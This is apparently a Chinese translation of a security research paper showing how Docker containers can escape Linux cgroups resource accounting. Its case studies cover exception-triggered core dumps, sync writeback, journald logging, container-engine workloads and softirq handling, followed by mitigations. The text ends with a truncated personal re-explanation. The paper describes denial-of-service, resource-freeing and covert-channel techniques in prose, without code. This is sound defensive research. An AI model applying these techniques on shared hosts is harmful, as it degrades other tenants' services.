特别地，Linux内核服务中断分为两部分:上半部分(即硬件中断)和下半部分(即软件中断)。由于硬件中断可能随时被引发，因此上半部分仅通过响应硬件中断来执行轻量级操作，然后安排(延迟)下半部分的执行。当在下半部分执行中断处理程序时，内核运行在软件中断上下文中，因此它不会为系统资源(例如CPU)收取任何进程的费用。 从内核3.6开始，softirq的处理(硬件中断引发的除外)与生成它们的进程绑定。 这意味着在softirq上下文中所消耗的所有资源都不会消耗所引发进程的任何配额。此外，softirqs的执行将抢占当前进程上的任何工作负载，所有进程将被延迟。 此外，如果处理softirqs的工作负载过重，内核将把它们卸载到内核线程ksoftirqd，这是一个每个CPU(即每个CPU一个线程)的内核线程，并以默认的进程优先级运行。一旦卸载，对softirqs的处理将在ksoftirqd的进程上下文中运行，因此任何资源消耗都将在线程ksoftirqd上计算。在这种情况下，它属于内核线程策略(如图所示的策略❷ )。总之，如果一个进程(称为进程A)能够引发大量的软件中断，内核将不得不在中断上下文或ksoftirqd的进程上下文中花费资源来处理软中断，而不向进程A支付费用。 CASE STUDIES ON CONTAINERS在前一节中，我们讨论了几种可能的策略来逃避cgroups的资源控制。然而，在现实的容器环境中，由于存在其他合作安全策略，开发更具挑战性。在本节中，我们将介绍在Docker容器环境中进行的五个案例研究，以演示利用cgroups弱点的详细步骤。 Threat model 我们考虑一个多租户容器环境，其中属于不同租户的多个Docker容器共享同一台物理机器。目前，边缘和云平台都广泛采用了多租户环境。系统管理员使用cgroups为每个容器设置资源限制。每个容器都是去特权的，设置有有限的CPU时间、系统内存、块I&#x2F;O带宽，并固定到特定的核心。我们假设攻击者控制了一个容器实例，并试图利用cgroups中的不足(1)降低其他容器的性能，(2)获得不公平的优势。 Configuration 我们使用Docker容器通过提供的接口来设置cgroups的配置。此外，Docker还默认确保容器通过namespace隔离。特别是，启用USER namespace后，容器中的根用户将映射到主机上的非特权用户。 因此，容器中的特权操作不会影响主机内核。我们的案例研究就是在这样一个没有特权的容器中进行的。 为了演示每种利用的有效性，我们通过在空闲服务器上设置多个cgroup配置来初始化容器，并测量主机上系统资源的利用率。为了模拟边缘和云环境，我们选择了两个测试平台来进行实验:(1)我们实验室的本地机器;(2) Amazon EC2中的专用主机。特别是，虽然我们的本地测试台配备了7200 rpm的SATA硬盘驱动器，但我们在EC2服务器上选择了更好的I&#x2F;O配置。专用试验台的存储配置了1000iops的SSD(默认为400)，吞吐量比我们本地试验台提高20倍左右。因此，本地测试平台表示可能部署在边缘环境中的性能较低的节点，而强大的专用服务器可以模拟多租户容器云环境。 Ethical hacking concerns 使用cgroup将不可避免地产生主机级的影响，这可能会影响主机服务器上所有容器的性能。因此，对于我们在Amazon EC2上的实验，我们选择使用专用服务器，该服务器仅供我们使用，不与其他租户共享。 此外，它还允许我们模拟多租户容器环境并度量系统范围的影响。 Result summary 表给出了所有案例研究的总体总结、相应的开发策略和影响。第一个案例研究是利用内核中的异常处理机制，这涉及到策略❶。我们发现容器中引发的异常可以调用用户空间进程，其后果是容器可以消耗比cgroups限制多200倍的CPU资源。第二种情况是利用回写机制进行磁盘数据同步，这涉及到策略❷。容器可以不断调用全局数据同步，以降低主机上特定I&#x2F;O工作负载的速度，最高可达95%。第三种情况是利用系统服务日志(通过策略❸)，产生消耗CPU和块设备带宽的工作负载。第四种情况是利用容器引擎在容器引擎进程(策略❸)和内核线程(策略 ❷)上产生额外的未计算的工作负载(大约3倍)。最后一种情况是利用softirq处理机制在内核线程(策略 ❷)和中断上下文(策略❹)上消耗CPU周期。 Case 1:Exception Handling第一种情况是利用内核中的异常处理机制。我们发现可以调用用户模式助手API，并通过异常进一步触发用户空间流程(作为策略❶)。通过反复产生异常，一个容器消耗的CPU资源比限制多约200倍，从而使同一主机(不限于一个核)上其他容器的性能显著降低85% ~ 95%。 Detailed analysis Linux内核为各种异常提供了专用的异常处理程序，包括错误(例如，分割错误)和陷阱(例如，溢出)。内核维护一个中断描述符表(IDT)，其中包含每个中断或异常处理程序的地址。如果CPU在用户模式下引发异常，相应的处理程序将在内核模式下调用。处理器首先在内核堆栈中保存寄存器，然后相应地处理异常，最后返回到用户模式。整个过程在内核空间和触发异常的进程上下文中运行。因此，它将被充电到正确的相应的cgroups。 然而，这些异常将导致初始进程的终止并引发信号。这些信号将进一步触发内核转储功能，生成一个用于调试的内核转储文件。内核中的核心转储代码通过usermode辅助API从内核中调用一个用户空间的应用程序。在Ubuntu中，默认的用户空间核心转储程序是Apport，它将在每个异常情况下被触发。正如上一节所提到的，Apport所消耗的系统资源将不会由容器承担，因为该进程是由内核线程分叉的，而不是由容器化的进程。 新产生的Apport实例将被内核安排到所有的CPU核心，以达到负载平衡的目的，因此打破了cpusets的cgroup。同时，由于Apport进程的运行比轻量级的异常处理（即内核控制路径）消耗更多的资源，如果容器不断引发异常，整个CPU将被Apport进程完全占据。cpu cgroup的逃逸导致分配给容器的系统资源的巨大放大。 Workloads amplification 为了研究这种影响，我们在一个核心上启动并固定一个容器。我们通过调整周期和配额来为容器设置不同的CPU资源限制。 容器进入循环，不断引发异常。我们实现了几种用户空间程序可用的异常类型。由于不同类型的异常的结果是相似的，我们使用div 0异常作为例子。容器是唯一在我们的测试平台中运行的活动程序。我们通过top命令测量测试平台的CPU使用率，通过Docker的统计工具测量容器的CPU使用率。对于主机级别的使用情况，我们将所有内核的CPU使用量汇总在一起（因此12个内核的最大使用量为1200%）。我们将放大系数定义为主机的CPU利用率与容器的CPU利用率的比率。 图演示了用户模式助手API可以触发用户空间程序，从而显著提高容器的CPU使用率。在我们的本地测试平台上，容器使用的一个内核上的CPU利用率只有7.4%，整个12个内核都被占用了。当我们将分配给容器的CPU资源减少到仅10%内核(通过设置period为200,000,quota为20,000)后，这个问题无法缓解。我们进一步将容器的CPU限制降低到20%核心，并最终将12个核心的总利用率限制到1,065%，放大因子为207×。同时，系统内存使用增加了约1GB，而Docker测量的容器内存使用仅为15.58MB。 我们从EC2服务器上获得了类似的结果:容器的22.5%的利用率就可以耗尽36个内核。由于CPU频率不如我们的本地测试平台强大，一旦我们将容器的CPU资源限制为1&#x2F;10内核，它可以在所有36个内核上产生1907%的利用率。放大系数约为192×。 The pid controller 虽然放大要求容器不断抛出异常，但我们进一步使用pid cgroup子系统对容器的任务数量设置一定的限制。同样，如图所示，即使活动进程的数量被限制在50个，pid控制器也不能降低放大结果，这是一个非常小的数字，可能会对容器用户造成巨大的可用性影响。在单核CPU计算能力只有20%的情况下，将pid限制为50，放大系数可以降低到98×。在EC2服务器上，在单核10% CPU计算能力的容器上，通过将pid数量限制在50个，放大系数在144×左右. Denial-of-service(DoS) attacks 当多个容器在同一个核心上运行时，它们将共享和竞争CPU资源。Linux的CFS系统根据每个容器的份额来分配CPU周期。CFS系统确保了完全的公平性，即容器可以完全利用其插槽中的所有资源。然而,如果一个恶意的容器可以在它自己的cgroup之外产生新的工作负载，CFS系统也会将CPU周期分配给这些进程，从而减少其他co-residence容器的使用。同时，CPU使用率的下降也可能影响其他的性能，如内存和I&#x2F;O吞吐量。 在我们的实验中，我们通过利用恶意容器中的异常处理机制来衡量DoS攻击的影响。我们运行两个容器:一个恶意容器和一个受害者。我们将攻击的性能与恶意容器运行正常工作负载(即基线)的情况进行比较。受害容器运行不同的sysbench工作负载来度量性能。 这两个服务器上的结果如表所示。我们首先将两个容器设置在相同的内核上，使用完全相同的CPU共享和配额。我们发现，在我们的本地测试平台上，抛出异常(导致内核转储)可以显著降低95%的CPU和内存性能，并降低17%左右的I&#x2F;O性能。在EC2服务器上，大约85%用于CPU和内存性能，82%用于I&#x2F;O性能。这是合理的，因为引发异常会导致大量用户空间核心转储应用程序与受害容器竞争CPU周期。 通过将容器固定在不同的核心上，我们进一步改变了恶意容器的核心亲缘性。尽管恶意容器不再与受害者竞争同一内核上的CPU资源，但它在受害者的性能上仍然显示出类似的结果。这是因为CPU资源的主要竞争对手不是恶意容器，而是那些触发内核转储的应用程序。 这一结果表明，恶意租户可以很容易地利用容器来显著降低同一主机上所有其他容器的性能，并降低服务供应商的服务质量，从而可能导致巨大的经济损失，而成本很少。 Case 2:Data Synchronization我们的第二个案例是利用磁盘数据同步的回写机制，出于性能考虑，该机制被广泛采用。CPU只会将更新后的数据写入缓存，当缓存被清除时，数据才会写入磁盘。 由于懒惰的磁盘回写机制将启动I&#x2F;O的进程与同步磁盘写入的进程解耦，所以我们的利用可以逃避cgroups。有多种方法可以触发数据同步，包括定期回写和内存不足。它也可以由用户进程通过系统调用故意调用，如sync（将缓存文件数据的所有未决修改写回给底层文件系统）、syncfs（同步开放文件所指的文件系统）和fsync（将文件的所有修改数据传输到其常驻磁盘设备）。这些系统调用对Linux容器是可用的。特别是，我们发现，同步可以被利用来减慢整个系统的I&#x2F;O性能（例如，在序列写入上有超过87%的降级），发起无资源攻击，并建立秘密通道。 Detailed analysis on sync 同步的第一步是启动一个内核线程，它将页缓存中包含的所有脏页刷新到磁盘。它通过扫描所有当前挂载的文件系统来查找要刷新的所有脏索引节点，并刷新相应的脏页。由于同步允许进程将所有脏缓冲区写回磁盘，任何I&#x2F;O操作都必须等待刷新。 更糟糕的是，由其他进程(可能属于另一个容器)生成的脏缓冲区也将被迫写回磁盘。 容器中的进程可以在不执行I&#x2F;O操作的情况下，以少量的工作负载重复调用sync。但是，与此同时，如果在其他共驻留容器上有I&#x2F;O操作，同步将回写所有脏页。在我们的实验中，我们运行了一个不断调用sync的容器。它不会导致超出容器限制的任何额外利用率。然而，一旦我们运行另一个容器，进行一些简单的写操作，同步操作就会导致大量的CPU等待时间，这是同步和写操作的组合所产生的。CPU等待时间用于指示I&#x2F;O等待所消耗的时间，其他工作负载仍然可以使用它。 但是，在其他容器上运行的特定工作负载的性能会受到显著影响。 blkio cgroup 正如2.1节中提到的，blkio cgroup子系统可以对块设备应用I&#x2F;O控制。虽然Docker只支持通过权重来限制相对I&#x2F;O吞吐量，但内核实际上可以为cgroups设置一个上限。我们使用blkio对运行同步的容器应用I&#x2F;O控制。不幸的是，基于Docker的统计工具，容器的I&#x2F;O吞吐量为零。因此，blkio控制器不能减少同步的影响。原因是由sync触发的所有回写工作负载都在内核线程中处理，调用sync的容器没有I&#x2F;O工作负载。 I&#x2F;O-based DoS attacks 不管发出I&#x2F;O操作的进程是否在容器内，在容器内调用系统调用同步将继续调用系统范围的回写。在某些情况下，回写会降低系统性能，因为特定的工作负载需要等待回写完成。为了测试有效性，我们运行两个固定在两个不同核心上的容器。恶意容器所做的唯一任务是调用系统调用sync，因此本身不会招致I&#x2F;O操作。 为了测量受害容器的性能，我们在受害容器内运行FIO基准测试来测量I&#x2F;O性能。特别地，我们进行了四种不同的FIO工作负载，包括序列&#x2F;随机写和序列&#x2F;随机读。我们还运行UnixBenchmark来测试除I&#x2F;O以外对性能的影响。我们通过将结果除以恶意容器中运行空闲循环的基线情况来计算性能下降。结果如图所示。对于UnixBenchmark，我们列出了性能显著下降的工作负载。总的来说，我们可以看到在受害者中运行的FIO基准测试的性能受到了很大的影响。通过在恶意容器中不断调用sync，所有四种类型I&#x2F;O操作的性能都会受到显著影响。对于顺序写入，在我们的本地测试床上性能下降到2%，在EC2服务器上下降到13%。 对于UnixBenchmark，运行shell脚本的性能也严重降低到不到一半。对于其他基准测试，退化约为5%到10%。 Resource-Freeing Attack(RFA) RFA攻击的目标是通过争夺受害者的瓶颈资源来为攻击者的实例释放特定的资源。在容器环境的情况下，两个容器在争夺系统资源，如CPU。恶意容器试图提高其工作负载的性能（被称为beneficiary），以获得更多的系统资源。因此，恶意容器运行另一个轻量级程序（被称为helper）来释放受害者容器使用的资源，以便受益者能够获得更多的资源。帮助者只消耗很少的系统资源（因此它对beneficiary几乎没有影响），但可以显著影响在受害者容器内运行的工作负载。例如，在恶意容器中，受益者程序可以运行CPU密集型的工作负载，并与受害者容器在同一CPU核心上竞争CPU资源。受害者容器运行I&#x2F;O密集型的工作负载，因此CPU活动与I&#x2F;O操作的频率相联系：更多的I&#x2F;O操作使受害者容器消耗更多的CPU周期来处理这些请求。然后，恶意者运行一个辅助程序，定期调用sync，触发回写，并减少受害者的I&#x2F;O活动。这样可以降低受害者容器的CPU使用率，恶意容器可以获得更多的CPU资源。我们通过在同一个核上运行两个容器来模拟实验。在受害容器中，我们模拟了一个网络爬虫的情况，其中容器不断地将一个网页写入一个新文件。 我们使用sysbench来测量恶意容器的CPU和内存性能，其中值越高表示性能越好。恶意容器还会定期调用sync来触发全局回写。对于基线情况，只有攻击者的容器是活动的，因此不存在对所有系统资源的竞争。然后，我们运行这两个容器，并将攻击者容器的性能与基线情况进行比较。如图，在没有RFA攻击的情况下，由于两个容器争夺同一核上的CPU资源，CPU性能(即白条)约为无竞争情况(即黑条)的一半，内存性能约为无竞争情况的1&#x2F;3。然而，通过发起RFA攻击(即灰色条)，恶意容器内的受益人可以在两个测试平台上获得更好的性能。特别是，在我们的本地服务器上，性能几乎与没有竞争的情况相同。 Covert Channels 最后，我们证明了cgroups中的不足也可能被恶意攻击者利用，在不同的核心之间构建基于时间的隐蔽通道。其思想是利用由磁盘数据同步引起的性能差异。我们测量在一个容器中写入10个文件的时间，同时在另一个内核的另一个容器中运行sync。 我们重复实验100次，所需要的时间分布如图所示。我们可以观察到运行同步和不运行同步之间打开文件的明显时间差异。我们通过利用性能差异构建了一个概念验证通道，能够以2bits&#x2F;s的速率传输数据，错误率为2%。 Case 3:System Process - Journald我们的第三个案例是利用system - Journal服务，它提供了一个系统服务来收集系统日志数据，包括内核日志消息、系统日志消息(例如，syslog调用或Journal API)，以及通过审计子系统的审计记录。所有相关的活动都由系统进程日志记录。在我们的案例研究中，我们发现容器中的三类操作可以迫使日志进程记录日志，导致5%到20%的额外CPU利用率和平均2MB&#x2F;s的I&#x2F;O吞吐量，然后可以利用这些影响其他容器的性能。 Detailed analysis 主机的系统进程被附加到不同于容器中的进程的cgroup中，因为它们是由操作系统维护的，以提供全系统的功能。因此，如果容器内的工作负载可以触发这些系统进程的活动，那么这些活动所消耗的资源将不会被计入容器的cgroup，从而逃避资源控制机制。但是，运行在主机上的系统进程会忽略容器内的大部分操作。例如，在主机上运行的用户空间进程的许多活动将由日志记录。但是如果流程在容器内运行，那么这些活动将被忽略。为了记录容器内的事件，主机上的系统管理员需要更改system -journal服务的配置。 特别是，Docker提供了一个选项来启用日志记录。 然而，我们发现，即使没有启用日志记录选项，在某些特定的情况下，容器仍然能够在日志系统进程上生成不可忽略的工作负载。 特别地，我们介绍了导致系统进程负载的三种类型的操作，从而逃脱了cgroup的控制。 Switch user (su) command su命令提供了一种将登录会话的所有权切换到root用户的方法。 切换到root用户的操作将被记录在日志系统进程中。日志包含进程、用户帐户和环境切换的信息。日志服务也会记录用户的退出。使用USER namespace，容器内的根用户映射到主机上的无特权用户。因此，容器中的进程可能在USER名称空间中拥有完全的特权，但实际上在主机上被剥夺了特权。作为容器中的根用户，su命令可以进入另一个用户。不幸的是，在容器内切换帐户所引起的活动将触发system -journal服务来记录相关信息。 Add user&#x2F;group 在USER namespace中，容器用户可以添加新组或在现有组中添加新帐户。这些活动也将由主机上的日志系统进程记录。 Exception 最后，如前所述，内核无法区分所引发异常的上下文(在容器内部或外部)。因此，容器内异常引起的崩溃信息也会触发主机上系统进程的日志记录活动。 所有上述工作负载都将在日志中触发大量事件日志记录。同样，我们将一个容器设置为具有一个CPU核心计算能力，以继续调用上述命令。在我们的本地测试床上，我们观察到journald上的CPU使用率恒定为3.5%，auditd上的CPU使用率恒定为2.5%，kauditd上的CPU使用率恒定为1%。在EC2服务器中，由于其更好的I&#x2F;O性能，这个数字要大得多:我们观察到平均CPU利用率约为20%。我们还发现，journald进程的平均I&#x2F;O吞吐量约为2MB&#x2F;s，而容器的I&#x2F;O吞吐量为零。如果我们为容器分配更多的计算资源，这个数字将会增加。 DoS attacks 日志journald活动将产生不可忽略的I&#x2F;O操作，这将导致与其他容器的资源竞争。为了衡量结果，我们在主机的不同内核上运行两个容器。在恶意容器中，我们不断切换用户(即su)并退出当前用户(即exit)。在受害容器中，运行与case 2中描述的相同的基准测试。 图显示了结果。总的来说，我们看到整个系统的性能下降。在I&#x2F;O性能较差的服务器(例如，我们的本地测试平台)中，滥用journald的攻击将更加有效。如前所述，它在日志进程中可能导致超过2MB&#x2F;s的I&#x2F;O吞吐量。我们观察到它仍然可以使EC2专用服务器上的其他容器在1000iops(吞吐量约为15MB&#x2F;s)时变慢。在一个具有默认配置的专用服务器中(例如，400 IOPS，吞吐量约为6MB&#x2F;s)，我们可以观察到更明显的结果。 Residual effect 在I&#x2F;O性能较差的服务器上，系统进程的写工作负载可能超过服务器的I&#x2F;O能力。结果，大量的日志事件被排队，等待稍后被记录。这将导致一个残留效应:即使容器停止了它的工作负载(例如su)，系统仍将继续在journald中写入，直到队列中的工作负载完成。残留效应在我们的本地测试平台上很明显，并且持续的时间比工作负载的运行时间长得多。即使容器完全空闲，CPU和I&#x2F;O资源也会被消耗。更糟糕的是，这些写入操作将显著影响其他容器和主机的I&#x2F;O性能。 Case 4:Container Engine容器的第四种情况是通过在内核线程(例如kworker)和容器引擎上触发额外的工作负载来利用容器引擎，容器引擎需要在主机上运行以支持和管理容器实例。特别是，容器引擎作为系统上的特权守护进程运行，因此它作为容器实例附加到不同的cgroup上。容器实例上的cgroup限制将不能控制引擎上消耗的资源。总的来说，通过这种方式，我们发现一个容器可以将资源消耗增加到大约3倍。 Detailed analysis 我们首先简要介绍Docker容器引擎及其cgroup层次结构。Docker创建一个包含所有容器实例的Docker cgroup。每个容器由其ID标识，并保存由fork创建的所有进程。从理论上讲，容器内运行的所有工作负载都将被计入容器cgroup。 此外，Docker构建在Docker引擎之上，其中一个守护进程(即dockerd)在后台运行，处理Docker映像的管理。Docker引擎然后与containd(一个守护进程)通信，以进一步使用runC来运行容器。dockerd进程对于每个容器实例都有多个子进程。这些进程被附加到所有系统服务的默认cgroup中。 此外，用户主要通过命令行接口(CLI)客户端(即Docker进程)控制和管理Docker, Docker进程通过Docker REST API与Docker守护进程交互。Docker CLI为用户提供了创建或执行容器的接口。它还提供了多个命令来设置与底层控制组相关的资源限制的配置。与Docker引擎进程类似，Docker CLI也不属于容器的cgroup。 利用容器引擎来打破cgroups的控制是相当容易的。一种简单的方法是利用终端子系统。当容器用户与tty设备交互时，数据首先经过CLI进程和容器守护进程，然后到达tty驱动程序进行进一步处理。具体来说，数据被发送到LDISC, LDISC连接高级通用接口(例如，读、写、ioctl)和终端系统中的低级设备驱动程序。通过在kworker内核线程中执行工作队列将数据刷新到LDISC。因此，内核线程上的所有工作负载和所有容器引擎进程都不会被计算到容器实例中。 我们通过在终端中反复显示主机中所有加载的模块来测量容器引擎中生成的工作负载，并将结果说明在图中。同样，容器的使用仅限于一个核心(如图中的container)。 总的来说，使用一个核心的计算能力(100%的利用率)，容器可以通过滥用docker引擎进程在主机上造成大约300%的工作负载。 为了细分使用情况，docker进程属于主机的用户cgroup；其他docker进程属于一个系统cgroup：docker.service。其余的（大部分是内核线程kworker，由于流媒体工作负载，如第3.2节所解释）属于根cgroup。我们还在case 1中进行了与表类似的实验。通过利用Docker容器引擎，攻击者能够降低CPU和内存的性能大约15%。 Case 5:Softirq Handling最后一种情况是利用Linux内核中的softirq处理机制。当前内核定义了11种类型的softirq。特别是，硬件中断处理程序通常会引发软中断。 虽然大多数硬件中断可能不是由容器直接引发的，但容器用户能够操作网络接口上的工作负载生成NET softirq，或块设备生成block softirq。处理这些softirq会消耗内核线程进程上下文(例如ksoftirqd)或中断上下文上的CPU资源。 NET softtirq 一旦NIC完成数据包传输，就会引发中断，而softirq负责在驱动程序缓冲区和网络堆栈之间移动数据包。但是，在流量带宽有限的情况下，使用softirqs带来的开销可以忽略不计:在之前的工作中，当网络流量超过1gbps时，开销为1%。 我们发现，由于网络流量引起的开销会被服务器上的防火墙系统(如iptables)大大放大。iptables建立在netfilter的基础上，提供了一个管理层，用于包过滤规则的添加和删除。netfilter将数据包挂在网络驱动程序和网络堆栈之间。所有的网络数据包首先通过过滤规则进行检查，然后进行进一步的操作(例如，转发、丢弃、由网络堆栈处理)。因此，iptables下的网络流量处理是在softirq上下文中处理的，因此不会向生成或接收流量的容器收费。 在Linux上，Docker依赖于配置iptables规则来为容器提供网络隔离。特别是，它可能为提供web或网络服务的容器设置多个规则。即使容器停止，规则也存在。更糟糕的是，在某些情况下，如果相关标志设置为true，容器可以对系统iptables规则进行更改。一旦有相当数量的规则，开销将是不可忽略的。 我们测量了softirq在不同数量的iptables规则下处理网络流量所带来的开销，如图所示。特别是，我们测量了所有ksoftirqd内核线程的CPU使用情况，以及花在中断上下文上的时间(来自top命令的hi和si)。在我们本地的测试台上，网卡的容量为100mbit &#x2F;s，网络流量约为20 ~ 30mbit &#x2F;s，明显小于中的Gbps级别。我们可以清楚地看到，处理网络流量会产生巨大的开销，并且与规则数量密切相关。当规则数量达到5000条时，CPU将浪费大量的时间(约16%)处理软tirq，并且不会向发起网络流量的容器收费。一旦服务器中有10,000条规则，开销约为40%，其中大多数集中在一个核心上。 EC2服务器有一个非常强大的网卡，具有10,000 Mbit&#x2F;s的容量，与我们的本地测试平台相比带宽更高。因此，与我们的本地测试平台相比，开销略小。在我们的实验中，当网络流量约为300mbit &#x2F;s时，流量仍然会浪费不可忽略的CPU周期。如3.4节所述，软件中断的处理要么抢占当前工作，要么在内核线程中消耗CPU周期。因此，同一核心上的所有其他工作负载将被延迟。 BLOCK softirq 处理softirq时增加工作负载的另一个例子是块设备上的I&#x2F;O操作。Linux内核使用队列存储块请求I&#x2F;O，并将新的请求添加到队列中。一旦请求处理完成，它将引发在softirq上下文中处理的softirq，以进一步处理队列。然后，利用BLOCK softirq转义cgroups的基本思想类似于利用NET softirq。 在容器上下文中，可以通过持续查询完成队列中的事件并提交写或读操作来生成这样的工作负载。对于I&#x2F;O性能较差的设备，这种影响尤其明显。为了进一步定量度量影响，我们使用固定在一个内核上的容器，运行fio推荐来执行顺序读写。我们选择小块用于写入，大块用于读取。我们测量多个内核线程(如kworker)的CPU利用率。容器中的工作负载能够在我们的本地测试平台上的内核上生成不可忽略的工作量，包括相同内核的kworker上16.7%的工作负载。此外，对于序列I&#x2F;O读取，文件分配过程在jpd2和kswapd上分别产生了3.9%和3.8%的额外利用率。最后，我们还利用kworker来测量退化。我们在同一个内核上的内核线程kworker上创建工作负载，攻击者能够对受害者造成大约10%的性能损失(根据sysbench基准测试测量)。 MITIGATION DISCUSSION在这一节中，我们将介绍我们在以下方面的初步努力应对现有cgroups机制的不足所带来的安全问题。由于大多数问题涉及多个内核子系统，因此很难部署一个单一的解决方案来全面彻底地解决所有问题。另外，解决一些问题可能需要重新设计当前的资源核算系统。在下文中，我们将从不同角度讨论潜在的缓解方法。 直观地说，通过考虑由一组进程(或容器)直接或间接生成的所有工作负载，cgroups应该具有细粒度的计算机制。例如，如果一个容器通过内核线程调用另一个用户空间进程，容器的cgroup应该由内核线程传递，这样它也会被复制到新的用户空间进程。因此，新调用的进程与容器属于同一个cgroup，而不是与内核线程属于根cgroup。虽然这种方法可以应用于新生成的进程，但很难处理系统中已经存在的进程。内核线程(如kworker、ksoftirqd)是由内核创建的，用于处理特定的内核工作负载，这些工作负载可能由附加到不同cgroup的不同进程触发。journald系统进程的情况也类似:它记录所有进程引发的所有相关事件，因此将整个日志进程附加到特定的cgroup是不合理的。因此，综合机制不应该改变这些线程的cgroup，而是应该跟踪特定工作量的系统资源，并将其收费给初始进程。例如，Iron跟踪处理每个网络数据包的CPU周期，并向相关进程收费。然而，这样的方法无疑需要大量的内核开发工作，并且由于将多个内核函数用于细粒度资源跟踪而带来大量的运行时开销。 对于某些工作负载，另一个有争议的问题是cgroup是否应该向容器收取这些系统资源。从隐私的角度考虑，主机服务器不应该记录容器实例中运行的任何敏感信息。journald提供了特定的选项来启用容器内的日志活动。但是，我们展示了，即使没有启用日志记录选项，主机仍然为容器记录多个事件。日志记录是由主机执行的，因此不应该向容器收费。此外，容器用户无法获得容器内引发的异常的核心转储信息。因此，一种可能的方法是通过区分容器上下文禁用所有潜在的日志记录或记录活动。完全解决这个问题的另一种方法是构建一个额外的cgroup子系统，专门用于日志记录。所有日志记录活动都将由新的日志记录cgroup子系统进行记录。 最后，有些问题即使使用细粒度的会计机制也无法解决。例如，虽然当前的cgroups机制清楚地提到回写工作负载不被计算在内，但Linux内核维护者已经开始开发新的cgroup机制(即cgroup v2)，它利用内存和blkio子系统来跟踪回写并为脏页的容器收费。然而，恶意容器可以在不生成任何I&#x2F;O工作负载的情况下继续调用sync。回写工作负载由具有I&#x2F;O操作的容器承担，而不是由恶意容器承担。同时，向调用数据同步的容器收取所有费用是不公平的。由于简单地禁用所有这些功能将不可避免地影响可用性，一个潜在可行的解决方案是对这些敏感操作施加速率限制。 RELATED WORK在本节中，我们调查了一些启发我们工作的研究工作，并强调了我们的工作与以往研究之间的差异。我们主要讨论以下两个方面的研究工作: Virtual Machine and Container虽然VM已经迎来了云计算时代，但尽管进行了大量的研究工作，其性能仍然不能令人满意。容器正变得越来越流行，因为它提供了一种启用轻量级虚拟化的替代方式，并允许在容器中运行的应用程序完全兼容。因此，研究人员对硬件虚拟化和容器之间的性能比较很好奇。Felter等人表明，通过使用一组涵盖CPU、内存、存储和网络资源的基准测试，Docker在所有情况下都可以实现比KVM更高的性能。 Spoiala等还证明了Docker优于KVM，并且可以使用Kurento Media Server来测试WebRTC服务器的性能，从而支持实时应用程序。Morabito et al进一步比较了传统hypervisor(例如KVM)和os级虚拟化(包括Docker和LXC)在计算、存储、内存和网络方面的性能，并观察到磁盘I&#x2F;O仍然是KVM hypervisor的瓶颈。所有这些工作都表明，基于容器的操作系统级虚拟化是比传统的基于vm的硬件虚拟化更有效的解决方案。虽然以前的大多数研究工作都集中在理解容器的性能上，但很少有人试图调查底层内核机制的资源共享的有效性。我们是第一批系统地研究由Cgroup不足引起的容器的性能和资源核算问题的人。 Container security除了性能，容器的安全性也受到了学术界和业界的广泛关注。Gupta首先简要介绍了Docker安全性。Bui从隔离和相应的内核安全机制方面对Docker容器进行了分析。虽然之前的工作声称Docker容器在默认配置下是相当安全的，但Lin等人发现，大多数现有的漏洞都可以通过默认配置成功地从容器内部发起攻击。Grattafiori等人总结了容器的各种潜在漏洞，包括基于内存的伪文件系统中的问题。Gao等人进一步对基于内存的伪文件系统由于namespace问题而产生的潜在安全影响进行了系统研究。Lei等人提出了一种名为SPEAKER的容器安全机制，以减少对应用程序的可用系统调用数量。Sun等人开发了两个安全命名空间，为容器实现自主安全控制，Arnautov等人提出使用Intel SGX保护Linux容器。 错误配置的能力也可以被利用来建立容器中的秘密通道。我们在cgroup方面的工作进一步补充了以前的的研究工作。 Cloud SecurityCo-residence大量的研究工作也致力于理解云的安全问题，特别是不同租户共享相同计算基础设施的多租户云。在多租户云环境中，攻击者可以将恶意虚拟机与目标虚拟机共同驻留在同一台服务器上，然后发起包括侧通道和隐蔽通道攻击在内的各种攻击。同时，侧面攻击和隐蔽通道攻击是验证同一物理服务器上共存的常用方法。例如，基于缓存的隐蔽通道被广泛采用，因为多个实例共享同一个包上的最后一级缓存。Zhang等人进一步论证了在云上发起真实侧通道攻击的可行性。除了基于缓存的通道，其他方法如内存总线、内存重复数据删除、核心温度也可以有效地构建隐蔽通道。 虽然也提出了多种防御机制，但之前的两项工作表明，在现有的主流云服务中实现合住仍然是可行的(而且成本低廉)。Wang等人对三种无服务器计算服务进行了大规模的测量研究，发现了几个资源核算问题，租户可能会滥用这些问题来运行额外的工作负载。 Denial-of-Service attacks由于底层计算资源在不同的租户之间共享，因此争用是不可避免的。Varadarajan等人提出了资源释放攻击来释放受害者使用的资源，这样攻击者的实例就可以获得额外的利用。Zhang等人调查了内存DoS攻击的影响，并表明恶意云客户可以对电子商务网站造成38倍的延迟。对于针对I&#x2F;O性能的DoS攻击，Huang等提出了级联性能攻击，以耗尽hypervisor的I&#x2F;O处理能力。此外，多种攻击试图耗尽共享的基础设施资源，如电力设施，从而迫使数据中心的服务器关闭。与之前的工作不同，我们的工作表明，cgroups中的不足也可以被利用来在多租户容器环境中发起多次攻击。 CONCLUSION在本文中，我们开发了一套策略来打破Linux控制组的资源控制。我们证明了通过进程创建继承的cgroups限制并不总是保证一致和公平的资源核算。我们可以通过与原始cgroup解关联的进程来生成带外工作负载。 我们进一步提出了五个案例研究，表明在Docker容器环境中实现这些攻击是可行的。恶意容器利用多租户容器环境中cgroups的这些不足，可以极大地耗尽主机的资源，并发起多种攻击，包括拒绝服务攻击、资源释放攻击和秘密通道攻击。我们在亚马逊EC2云中的本地测试平台和专用服务器上进行了实验，并证明了一个容器可以将其工作负载放大200倍以上，并将其他容器的性能降低95%。 MyCase 1Linux 内核为各种异常提供了专用的异常处理程序。这些异常处理程序分为两类：错误和陷阱。错误是指程序在运行过程中遇到的问题，如分段错误。陷阱是指程序主动触发的事件，如溢出检测。 在处理这些异常时，内核维护了一个名为中断描述符表（IDT）的数据结构。IDT 包含每个异常处理程序的地址。当 CPU 在用户模式下引发异常时，相应的处理程序将在内核模式下运行。 寄存器保存和上下文切换：当异常发生时，处理器首先将当前的寄存器状态保存到内核堆栈中。这样，在异常处理完成后，处理器可以恢复原始状态并返回到用户模式。 异常处理：在内核模式下，处理器会根据异常类型调用相应的处理程序。异常处理程序通常会执行一些特定的操作，如清理资源、记录错误信息等。在处理异常时，整个过程将在内核空间和触发异常的进程上下文中运行。因此，异常处理期间消耗的资源将被计入相应的 cgroups。 信号处理和内核转储：异常处理程序可能会终止初始进程，并向其发送一个信号。这些信号会触发内核转储功能，生成一个用于调试的内核转储文件。在 Linux 内核中，核心转储代码通过 usermode 辅助 API 调用一个用户空间的应用程序来完成这个任务。 用户空间核心转储程序：在 Ubuntu 中，默认的用户空间核心转储程序是 